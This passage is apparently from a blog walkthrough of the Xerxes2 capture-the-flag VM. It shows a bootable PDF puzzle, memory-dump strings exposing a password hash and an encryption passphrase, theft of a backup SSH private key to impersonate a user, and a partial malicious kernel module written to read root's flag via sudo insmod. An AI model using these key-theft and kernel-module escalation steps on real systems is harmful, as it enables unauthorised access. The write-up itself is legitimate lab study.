000001B0   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
000001C8   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
000001E0   00 00 00 00  00 00 00 00  55 AA 25 50  44 46 2D 31  2E 35 0A 25  D0 D4 C5 D8  &hellip;&hellip;..U.%PDF-1.5.%&hellip;.
000001F8   0A 34 20 30  20 6F 62 6A  20 3C 3C 0A  2F 4C 65 6E  67 74 68 20  32 39 32 20  .4 0 obj &lt;&lt;./Length 292
00000210   20 20 20 20  20 20 0A 2F  46 69 6C 74  65 72 20 2F  46 6C 61 74  65 44 65 63        ./Filter /FlateDec
00000228   6F 64 65 0A  3E 3E 0A 73  74 72 65 61  6D 0A 78 DA  6D 51 C1 6E  83 30 0C BD  ode.>>.stream.x.mQ.n.0..
00000240   E7 2B 7C 2B  48 23 25 49  09 E1 34 A9  DA AA 75 B7  4D 5C A6 69  07 0A A1 A0  .+|+H#%I..4&hellip;u.M.i&hellip;.
00000258   15 C2 20 19  E2 EF 07 0B  91 B6 AA 8A  14 3F DB CF  EF 59 C9 3E  45 DB 03 89  .. &hellip;&hellip;&hellip;.?&hellip;Y.>E&hellip;
00000270   20 C1 09 A7  1C D2 12 08  8D 70 2C 28  F0 98 63 4A  19 A4 05 BC  7B 07 65 DA   &hellip;&hellip;..p,(..cJ&hellip;.{.e.
00000288   C2 0F 22 1A  79 BA AA 07  8B F0 B6 30  4D 67 71 59  5F E4 9D 23  28 73 AE B4  ..&ldquo;.y&hellip;&hellip;0MgqY<em>..#(s..
000002A0   4D 26 65 36  85 A3 38 89  7A 6D 9A 41  96 E6 82 FD  8F F4 19 42  08 88 C0 09  M&amp;e6..8.zm.A&hellip;&hellip;.B&hellip;.
000002B8   4D AC E1 71  F3 2D 2D 49  B6 79 3F 75  5A 5E CD 5A  97 D5 F2 24  F3 6C 16 B3  M..q.&ndash;I.y?uZ^.Z&hellip;$.l..
000002D0   89 2A 1D 63  2D 74 6A 94  FD E0 8A 99  76 33 18 DF  B4 7E 53 C6  32 3E 5B 35  .*.c-tj&hellip;..v3&hellip;~S.2>[5
000002E8   5A 54 39 A0  95 8D 67 A9  AF 4D B2 61  18 55 5F AC  1B F5 F5 FC  04 F7 B7 E4  ZT9&hellip;g..M.a.U</em>&hellip;&hellip;&hellip;
00000300   9F B2 AE 9B  56 59 D3 EA  BA 3D FF 6E  81 1E 53 F4  85 68 18 C2  72 96 48 92  &hellip;.VY&hellip;=.n..S..h..r.H.
00000318   18 73 26 60  17 46 98 72  01 79 83 B6  C7 86 C0 83  42 2F 68 BF  FC 9B F8 F3  .s&amp;<code>.F.r.y......B/h.....
00000330   6D 74 97 60  1E 11 60 82  63 C6 56 AF  57 D9 C8 C6  A7 C2 3B F9  C1 7C CB 7E  mt.</code>..`.c.V.W&hellip;..;..|.~
00000348   DE 8E 31 E6  F5 73 35 20  DE FF 9E DB  E2 07 2D 39  89 30 0A 65  6E 64 73 74  ..1..s5 &hellip;&hellip;-9.0.endst
00000360   72 65 61 6D  0A 65 6E 64  6F 62 6A 20  25 25 45 4F  46 0A                     ream.endobj %%EOF.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>I was <span class="k">then</span> able to run this through pdf-parser again to get to object 4. Now, I wont show you that, what I will <span class="k">do</span> is show you this conversation...
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>9:34 AM <recrudesce> yeah
9:35 AM <recrudesce> oooh, interesting
9:35 AM <recrudesce> PDF Comment &lsquo;%\xd0\xd4\xc5\xd8\n&rsquo;
9:35 AM <recrudesce> dunno if that&rsquo;s just because of the way i&rsquo;ve made the file
9:39 AM <recrudesce> root@pwk:~# pdf-parser -w out.pdf
9:39 AM <recrudesce> PDF Comment %PDF-1.5
9:39 AM <recrudesce> PDF Comment %????
9:39 AM <recrudesce> obj 4 0
9:39 AM <recrudesce>  Type:
9:39 AM <recrudesce>  Referencing:
9:39 AM <recrudesce>  Contains stream
9:39 AM <recrudesce>   &lt;&lt;
9:39 AM <recrudesce>     /Length 292
9:39 AM <recrudesce>     /Filter /FlateDecode
9:39 AM <recrudesce>   >>
9:39 AM <recrudesce> PDF Comment %%EOF
9:39 AM <recrudesce> so i can see the stream
9:39 AM <recrudesce> OH
9:39 AM <recrudesce> MY
9:39 AM <recrudesce> GOD
9:40 AM <recrudesce>  /F15 9.9626 Tf 125.782 676.223 Td [(Found)-525(this)-525(./dump)-525(file,)-525(thought)-525(you&rsquo;d)-525(find)-525(it)-525(useful.)]TJ 0 -18.929 Td [(I&rsquo;ve)-525(encrypted)-525(it)-525(though,)-525(because)-525(of)-525(the)-525(powers)-525(that)-525(be&hellip;)]TJ 0 -18.929 Td [(You)-525(know)-525(how)-525(to)-525(get)-525(the)-525(password,)-525(right?)]TJ 0 -18.929 Td [(Happy)-525(hunting.)]TJ
9:40 AM <recrudesce> 200 0 0 200 197.638 405.268 cm
9:40 AM <recrudesce> Q
9:40 AM <recrudesce> BT
9:40 AM <recrudesce> 200 0 0 200 197.638 405.268 cm
9:40 AM <recrudesce> Q
9:40 AM <recrudesce> BT
9:40 AM <recrudesce> ./F8 9.9626 Tf 249.651 386.339 Td [(Remem)28(b)-28(er,)-333(rem)-1(em)28(b)-28(er)]TJ
9:46 AM <superkojiman> :)
9:46 AM <superkojiman> will play with it tonight. if i start ita t work i won’t get anything done
9:46 AM <recrudesce> i need to decode that file
9:46 AM <recrudesce> where is the qr code ?
9:47 AM <superkojiman> it&rsquo;s in the pdf.
9:47 AM <superkojiman> polito.pdf
9:49 AM <recrudesce> when i open that file i just get blank
9:49 AM <recrudesce> is it one of the streams ?
9:49 AM <recrudesce> ah, it&rsquo;ll be that 200x200 image
9:49 AM <recrudesce> which i&rsquo;ve not been able to get yet
9:49 AM <superkojiman> weird.
9:49 AM <recrudesce> how did you extract it ?
9:49 AM <superkojiman> it just shows on mine. :-/
9:49 AM <recrudesce> the PDF for me is completely blank
9:49 AM <superkojiman> opened it up in kali
9:49 AM <superkojiman> really?
9:49 AM <recrudesce> i&rsquo;ll try again
9:51 AM <superkojiman> i&rsquo;m using epdfview
9:51 AM <superkojiman> apt-get install epdfview
9:52 AM <recrudesce> wtf, it shows now
9:52 AM <superkojiman> :D
9:52 AM <recrudesce> so i just extracted all the text
9:52 AM <superkojiman> was wondering why you were getting all excited when you extracted that.
9:52 AM <superkojiman> i was like &ldquo;but i see it right here&hellip;&rdquo; :D
9:53 AM <recrudesce> i made that a lot more complicated than i needed
9:53 AM <recrudesce> feck</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Turns out the PDF I had was corrupt, and that the actual PDF looks like this
</span><span class='line'>
</span><span class='line'><span class="o">[</span>!<span class="o">[</span>xerxes2_006<span class="o">](</span>http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_006.png<span class="o">)](</span>http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_006.png<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>!<span class="o">[](</span>http://img3.wikia.nocookie.net/__cb20130417220142/mlp/images/6/61/FANMADE_Derp_by_WorkingOrder.gif<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Well didn<span class="s1">&#39;t I feel stupid ? The QR code decodes as &quot;XERXES is watching...&quot;, so that&#39;</span>s not of any use either. There<span class="s1">&#39;s got to be something still hidden in this PDF that I&#39;</span>m not seeing.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>root@pwk:~# file polito.pdf
polito.pdf: x86 boot sector, code offset 0xe0</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Wait, wut ? A bootable PDF ?
</span><span class='line'>
</span><span class='line'>!<span class="o">[](</span>http://www.reactiongifs.us/wp-content/uploads/2013/12/blinking_sword_in_the_stone.gif<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>OK, so, how to I boot this PDF I wonder ? Well, turns out this technique has already been used by <span class="o">[</span>PoC<span class="o">||</span>GTFO with their 2nd edition<span class="o">](</span>https://www.alchemistowl.org/pocorgtfo/pocorgtfo02.pdf<span class="o">)</span> - check out section <span class="m">8</span> to see instructions on using qemu. X11 forwarding required - luckily I <span class="nb">set </span>up X11 forwarding ages ago. Using the <span class="nb">command </span>found in PoC<span class="o">||</span>GTFO002, I ended up with the following screen
</span><span class='line'>
</span><span class='line'><span class="o">[</span>!<span class="o">[</span>xerxes2_007<span class="o">](</span>http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_007.png<span class="o">)](</span>http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_007.png<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nice, a password.  Lets get that dump file decrypted.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>polito@xerxes2:~$ gpg &ndash;output output.bin &ndash;decrypt dump.gpg
gpg: CAST5 encrypted data
Enter passphrase: amFuaWNl
pg: encrypted with 1 passphrase
gpg: WARNING: message was not integrity protected
polito@xerxes2:~$ ls -l output.bin
-rw-r&ndash;r&ndash; 1 polito polito 132120576 Aug  8 11:55 output.bin</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>I am going to assume this is a memory dump, so I figured the first thing to <span class="k">do</span> was to run strings on it - it scrolled text <span class="k">for</span> ages... I need to be more defined.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>polito@xerxes2:~$ strings output.bin | grep korenchkin
korenchkin.tar.enc
cat /home/korenchkin/.ssh/id_rsa
/home/korenchkin/.ssh/id_rsa
korenchkin.lock.xerxes2.trioptimum.538a05e1.00000a80
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWVtc1RjGcaeVDhmqvN/zQ+T2SoC2fHy+XTAq0HreospZLmKKW/oMeBuKmSJtWaELLqd92c5DVATacYJKbKLwgpGvkXenr7NRIJsLXIs5JVqOVyEt5BSsd0JfNAyK1cfLF2u6/5qcz3OG2R96zUdoXxyHWh1IGc38NUA+NsoBIcola1Y0tlXoYoA8s+RTk/1vn8PMG5NtEs5BklASSXL2fmUnb0QSg7g9G1XbyTucrixSXa+MLRbTfyVuqXHyfuVJwqWmg36kPQSuZJRBeFwlWLqim28tZd8iaL+J16MAv0zEUomo54Z5i2IPCJxbU1knwHy7yiJERJqmqaHaigI9/ korenchkin@xerxes2
1000      2905  0.0  1.1   9268  1480 ?        S    12:43   0:00 sshd: korenchkin@pts/0
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
<em>pammodutil_getpwnam_korenchkin_3
korenchkin
/home/korenchkin
/home/korenchkin
-UN*X-FAIL-korenchkin
/home/korenchkin
korenchkin
korenchkin
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
cat /var/mail/korenchkin
</em>pammodutil_getpwnam_korenchkin_2
korenchkin
<em>pammodutil_getpwnam_korenchkin_1
</em>pammodutil_getspnam_korenchkin_1
<em>pammodutil_getspnam_korenchkin_0
korenchkin
/home/korenchkin
korenchkin
korenchkin
/home/korenchkin
31 12:46:08 sshd[2506]: pam_unix(sshd:session): session opened for user korenchkin by (uid=0)
31 12:46:08 sshd[2506]: pam_unix(sshd:session): session opened for user korenchkin by (uid=0)
korenchkin
korenchkin:$6$WjgI1TzN$u8gOd9v8jR2ffDGWGOwtxc58yczo5fsZy40TM84pct.iSmlwRA4yV3.tdPnn5b8AWiQ.tnqUeInSQqkVEI2z3.:16221:0:99999:7:::
May 31 12:41:48 xerxes2 sshd[2749]: Accepted password for korenchkin from 172.16.32.1 port 33385 ssh2
May 31 12:41:48 xerxes2 sshd[2749]: pam_unix(sshd:session): session opened for user korenchkin by (uid=0)
May 31 12:43:40 xerxes2 sshd[2903]: Accepted password for korenchkin from 172.16.32.1 port 33398 ssh2
May 31 12:43:40 xerxes2 sshd[2903]: pam_unix(sshd:session): session opened for user korenchkin by (uid=0)
May 31 12:46:08 xerxes2 sshd[2506]: Accepted password for korenchkin from 172.16.32.1 port 33414 ssh2
May 31 12:46:08 xerxes2 sshd[2506]: pam_unix(sshd:session): session opened for user korenchkin by (uid=0)
ts/0korenchkin
korenchkin:x:1000:1000:Anatoly Korenchkin,,,:/home/korenchkin:/bin/bash
ts/0korenchkin
sshd: korenchkin [priv]
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWVtc1RjGcaeVDhmqvN/zQ+T2SoC2fHy+XTAq0HreospZLmKKW/oMeBuKmSJtWaELLqd92c5DVATacYJKbKLwgpGvkXenr7NRIJsLXIs5JVqOVyEt5BSsd0JfNAyK1cfLF2u6/5qcz3OG2R96zUdoXxyHWh1IGc38NUA+NsoBIcola1Y0tlXoYoA8s+RTk/1vn8PMG5NtEs5BklASSXL2fmUnb0QSg7g9G1XbyTucrixSXa+MLRbTfyVuqXHyfuVJwqWmg36kPQSuZJRBeFwlWLqim28tZd8iaL+J16MAv0zEUomo54Z5i2IPCJxbU1knwHy7yiJERJqmqaHaigI9/ korenchkin@xerxes2
</em>pammodutil_getpwnam_korenchkin_0
sshd: korenchkin@pts/0
/home/korenchkin/.bash_history
sshd: korenchkin
sshd: korenchkin@pts/0
<em>pammodutil_getpwnam_korenchkin_0
cat /var/mail/korenchkin
tar -cvf /opt/backup/korenchkin.tar ~/
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
rm /opt/backup/korenchkin.tar
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
korenchkin
/home/korenchkin
korenchkin
korenchkin
/home/korenchkin
root: korenchkin
sshd: korenchkin@pts/0
korenchkin.l
korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
korenchkin.lock
ome/korenchkin
cat /home/korenchkin/.ssh/id_rsa
/home/korenchkin/.ssh/id_rsa
korenchkin.lock.xerxes2.trioptimum.538a05e1.00000a80
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
sshd: korenchkin [priv]
</em>pammodutil_getpwnam_korenchkin_0
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWVtc1RjGcaeVDhmqvN/zQ+T2SoC2fHy+XTAq0HreospZLmKKW/oMeBuKmSJtWaELLqd92c5DVATacYJKbKLwgpGvkXenr7NRIJsLXIs5JVqOVyEt5BSsd0JfNAyK1cfLF2u6/5qcz3OG2R96zUdoXxyHWh1IGc38NUA+NsoBIcola1Y0tlXoYoA8s+RTk/1vn8PMG5NtEs5BklASSXL2fmUnb0QSg7g9G1XbyTucrixSXa+MLRbTfyVuqXHyfuVJwqWmg36kPQSuZJRBeFwlWLqim28tZd8iaL+J16MAv0zEUomo54Z5i2IPCJxbU1knwHy7yiJERJqmqaHaigI9/ korenchkin@xerxes2
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ .32.1
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ .32.1
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
ts/0korenchkin
2014-05-31 12:45:57 1WqmPt-0000dB-Bi => korenchkin <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x72;&#x6f;&#111;&#x74;&#x40;&#x78;&#x65;&#x72;&#120;&#101;&#115;&#x32;&#x2e;&#116;&#x72;&#x69;&#x6f;&#x70;&#116;&#x69;&#109;&#117;&#x6d;">&#x72;&#111;&#x6f;&#x74;&#64;&#x78;&#101;&#x72;&#120;&#x65;&#x73;&#x32;&#46;&#116;&#x72;&#105;&#x6f;&#x70;&#116;&#105;&#109;&#117;&#x6d;</a> R=local_user T=mail_spool
]0;korenchkin@x
korenchkin
korenchkin
korenchkin
korenchkin.lock
korenchkin
korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
korenchkin
/home/korenchkin
korenchkin
korenchkin
/home/korenchkin
<em>pammodutil_getpwnam_korenchkin_1
</em>pammodutil_getspnam_korenchkin_1
<em>pammodutil_getspnam_korenchkin_0
korenchkin
/home/korenchkin
korenchkin
-UN*X-FAIL-korenchkin
/home/korenchkin
korenchkin
korenchkin
tar -cvf /opt/backup/korenchkin.tar ~/
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
rm /opt/backup/korenchkin.tar
korenchkin.lock.xerxes2.trioptimum.538a05e1.00000a80
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
</em>pammodutil_getpwnam_korenchkin_2
korenchkin
sshd: korenchkin@pts/0
root: korenchkin
korenchkin.l
korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
korenchkin.lock
korenchkin
korenchkin
/home/korenchkin
ts/0korenchkin
/home/korenchkin
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ n
<em>pammodutil_getpwnam_korenchkin_3
korenchkin
/home/korenchkin
korenchkin
/home/korenchkin
ts/0korenchkin
cat /var/mail/korenchkin
tar -cvf /opt/backup/korenchkin.tar ~/
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
rm /opt/backup/korenchkin.tar
/home/korenchkin0
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 6MMMMb\  6MMMMb<br/>
]0;korenchkin@x
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ .32.1
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
/home/korenchkin/.terminfo
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 6MMMMb\  6MMMMb<br/>
korenchkin
/home/korenchkin
korenchkin
korenchkin
/home/korenchkin
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
USER=korenchkin
MAIL=/var/mail/korenchkin
PWD=/home/korenchkin
PWD=/home/korenchkin
HOME=/home/korenchkin
LOGNAME=korenchkin
/var/mail/korenchkin
USER=korenchkin
LOGNAME=korenchkin
HOME=/home/korenchkin
MAIL=/var/mail/korenchkin
korenchkin
/home/korenchkin
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
HOME=/home/korenchkin
/var/mail/korenchkin
MAIL=/var/mail/korenchkin
korenchkin
/home/korenchkin
korenchkin
/home/korenchkin
korenchkin
USER=korenchkin
korenchkin
LOGNAME=korenchkin
/home/korenchkin
/home/korenchkin
/home/korenchkin
</em>pammodutil_getpwnam_korenchkin_1
<em>pammodutil_getspnam_korenchkin_1
</em>pammodutil_getspnam_korenchkin_0
korenchkin
/home/korenchkin
korenchkin
-UN*X-FAIL-korenchkin
/home/korenchkin
korenchkin
korenchkin
polito@xerxes2:~$</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>That<span class="s1">&#39;s more workable - but wait, what&#39;</span>s that... a tarball encrypted into /opt/backup/ ?
</span><span class='line'>
</span><span class='line'>!<span class="o">[](</span>http://1.bp.blogspot.com/_pS7sKjlzwFg/TOMG_De_jfI/AAAAAAAAGX4/XfN7NH07GiA/s320/quagmire_jackpot.gif<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>OpenSSL can be used to decrypt the file to get the original tarball.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>polito@xerxes2:~$ openssl aes-256-cbc -d -salt -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out /home/polito/korenchkin/korenchkin.tar
polito@xerxes2:~$ ls -l korenchkin/
total 12
-rw-r&ndash;r&ndash; 1 polito polito 10240 Aug  8 12:05 korenchkin.tar
polito@xerxes2:~$ cd korenchkin/
polito@xerxes2:~/korenchkin$ tar xvf korenchkin.tar
.ssh/id_rsa
.ssh/id_rsa.pub
polito@xerxes2:~/korenchkin$</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Looks like Korenchkin is sensible and backs up his keypair... but now I have it, so user impersonation is possible.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>polito@xerxes2:~/korenchkin$ ssh -i .ssh/id_rsa <a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#107;&#111;&#x72;&#x65;&#x6e;&#x63;&#104;&#x6b;&#105;&#110;&#64;&#x31;&#50;&#x37;&#x2e;&#x30;&#x2e;&#48;&#46;&#x31;">&#107;&#111;&#x72;&#101;&#110;&#99;&#104;&#107;&#105;&#x6e;&#x40;&#49;&#50;&#55;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;</a>
The authenticity of host &lsquo;127.0.0.1 (127.0.0.1)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;127.0.0.1&rsquo; (ECDSA) to the list of known hosts.</p>

<p>Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.</p>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M&#8217;  <code>Mb MM'   </code> MM&#8217;  <code>Mb
 </code>MM,P   MM    MM MM&#8217;      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M&#8217;  <br/>
  d&#8217; <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M&#8217;    <br/>
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<p>You have new mail.
korenchkin@xerxes2:~$ id
uid=1000(korenchkin) gid=1000(korenchkin) groups=1000(korenchkin),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
korenchkin@xerxes2:~$</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Once again, my public key is <span class="nb">echo</span><span class="err">&#39;</span>d into .ssh/authorized_keys, and I am able to SSH in from my client.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>* * *
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c">## Holding the Con with Anatoly</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>!<span class="o">[](</span>http://img1.wikia.nocookie.net/__cb20120107145214/shodan/images/e/e1/Korenchkin.png<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>With great power comes great responsibility.  This is <span class="o">[</span>Anatoly Korenchkin<span class="o">](</span>http://shodan.wikia.com/wiki/Anatoly_Korenchkin<span class="o">)</span>.
</span><span class='line'>
</span><span class='line'>Korenchkin must be able to <span class="k">do</span> some important stuff - after all he worked alongside the captain of the Von Braun. Turns out my suspicion was correct
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>korenchkin@xerxes2:~$ sudo -l
Matching Defaults entries for korenchkin on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>

<p>User korenchkin may run the following commands on this host:
    (root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
korenchkin@xerxes2:~$</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Korenchkin can load and remove kernel modules as root without a password. This could be interesting as I have no idea about how kernel modules work. I started off compiling and loading a simple Hello World module from <span class="o">[</span>TheGeekStuff<span class="o">](</span>http://www.thegeekstuff.com/2013/07/write-linux-kernel-module/<span class="o">)</span>. It worked ! But can I make a malicious kernel module - possibly one that can <span class="nb">read</span> /root/flag.txt ? Yup, and here<span class="err">&#39;</span>s the code to <span class="k">do</span> it.
</span><span class='line'>
</span><span class='line'><span class="o">[</span>c<span class="o">]</span>
</span><span class='line'><span class="c">#include &lt;linux/module.h&gt;  // Needed by all modules</span>
</span><span class='line'><span class="c">#include &lt;linux/kernel.h&gt;  // Needed for KERN_INFO</span>
</span><span class='line'><span class="c">#include &lt;linux/fs.h&gt;      // Needed by filp</span>
</span><span class='line'><span class="c">#include &lt;asm/uaccess.h&gt;   // Needed by segment descriptors</span>
</span><span class='line'>
</span><span class='line'>int init_module<span class="o">(</span>void<span class="o">)</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>    // Create variables
</span><span class='line'>    struct file *f<span class="p">;</span>
</span><span class='line'>    char buf<span class="o">[</span>1024<span class="o">]</span><span class="p">;</span>
</span><span class='line'>    mm_segment_t fs<span class="p">;</span>
</span><span class='line'>    int i<span class="p">;</span>
</span><span class='line'>    // Init the buffer with 0
</span><span class='line'>    <span class="k">for</span><span class="o">(</span><span class="nv">i</span><span class="o">=</span>0<span class="p">;</span>i&lt;1024<span class="p">;</span>i++<span class="o">)</span>
</span><span class='line'>        buf<span class="o">[</span>i<span class="o">]</span> <span class="o">=</span> 0<span class="p">;</span>
</span><span class='line'>    // To see in /var/log/messages that the module is operating
</span><span class='line'>    printk<span class="o">(</span>KERN_INFO <span class="s2">&quot;My module is loaded\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    // I am using Fedora and <span class="k">for</span> the <span class="nb">test </span>I have chosen following file
</span><span class='line'>    // Obviously it is much smaller than the <span class="m">128</span> bytes, but hell with <span class="nv">it</span> <span class="o">=)</span>
</span><span class='line'>    <span class="nv">f</span> <span class="o">=</span> filp_open<span class="o">(</span><span class="s2">&quot;/root/flag.txt&quot;</span>, O_RDONLY, 0<span class="o">)</span><span class="p">;</span>
